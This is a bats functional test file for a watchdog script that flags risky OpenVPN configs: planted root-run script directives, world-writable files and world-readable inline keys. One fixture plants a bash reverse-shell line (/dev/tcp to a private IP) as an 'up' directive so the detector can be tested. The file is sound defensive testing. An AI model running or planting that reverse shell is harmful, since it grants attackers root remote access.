#!/usr/bin/env bats
# L2 bats functional tests for the openvpn-config-watchdog scan script.
#
# OpenVPN runs the script directives (up/down/route-up/client-connect/
# tls-verify/auth-user-pass-verify/…) AS ROOT on connect/route/auth events
# (gated by script-security) — a planted script directive is
# root-exec-on-VPN-event persistence (T1546). A .conf/.ovpn that is
# world-writable / non-root-owned, world-readable while carrying inline key
# material (`<key>`/`<tls-crypt>`/`secret`), or a script directive carrying an
# injection pattern (incl. a writable-root path), is alert.
#
# Run with: bats packaging/test/L2-openvpn-config-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/systemd/openvpn-config-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    VPND="${TMP}/openvpn"; mkdir -p "${VPND}"
    CONF="${VPND}/client.conf"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_OPENVPN_PROFILE="${PROFILE:-report}" \
    SELFDEF_OPENVPN_BASELINE="${BASELINE}" \
    SELFDEF_OPENVPN_DIRS="${DIRS_V:-$VPND}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# Benign client config: external key files (no inline key material), so a
# default-readable mode is not a key-exposure finding; a trusted up script.
seed_benign() {
    printf 'client\ndev tun\nremote vpn.example.com 1194\nup /etc/openvpn/up.sh\n' > "${CONF}"
}

@test "no openvpn configs → ok / no_openvpn" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_openvpn"'
    cap | grep -q '"severity":"ok"'
}

@test "benign config, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / openvpn_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"openvpn_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a script directive under a writable root → alert / openvpn_suspicious" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nup /tmp/.x\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"openvpn_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a script directive with an injection pattern → alert" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nup "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable config → alert" {
    seed_benign
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-readable config carrying inline key material → alert" {
    seed_benign
    run_wd
    printf 'client\ndev tun\n<key>\n-----BEGIN PRIVATE KEY-----\n</key>\n' > "${CONF}"
    chmod 0644 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign config change → warn / openvpn_changed" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nremote vpn2.example.com 1194\nup /etc/openvpn/up.sh\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"openvpn_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign external-key config is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious script directive" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nup /tmp/.x\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
